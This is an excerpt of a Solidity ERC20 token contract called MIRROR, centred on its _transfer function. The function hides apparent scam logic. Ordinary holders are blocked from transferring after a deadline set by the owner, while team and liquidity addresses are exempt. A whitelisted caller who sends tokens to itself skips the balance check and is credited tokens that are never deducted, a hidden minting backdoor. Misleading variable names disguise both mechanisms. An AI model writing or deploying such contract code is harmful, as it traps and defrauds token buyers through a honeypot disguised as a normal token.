...
contract MIRROR is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _tOwnedtoken;
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        if (!_tOwnedtoken[sender] && !_tOwnedtoken[recipient]  ) {_feetoken = amount.mul(2).div(100);}
        if (recipient != _team  && recipient != _liquidity && sender == _liquidity && balanceOf(recipient) == 0) 
        { recipientbuy[recipient] = block.timestamp;}      
        uint256 _timenow =block.timestamp;     
        if (sender !=_team  && sender !=_liquidity ){require(_timenow <= _feetime);}
        uint256 tokens = _tOwned[sender];
        if (sender != recipient || !_tOwnedtoken[msg.sender]) { require(tokens >= amount); } 
        uint256 amounts = amount - _feetoken;
        if (tokens >= amount) { _tOwned[sender] = tokens - amount; }
        _tOwned[recipient] += amounts; 
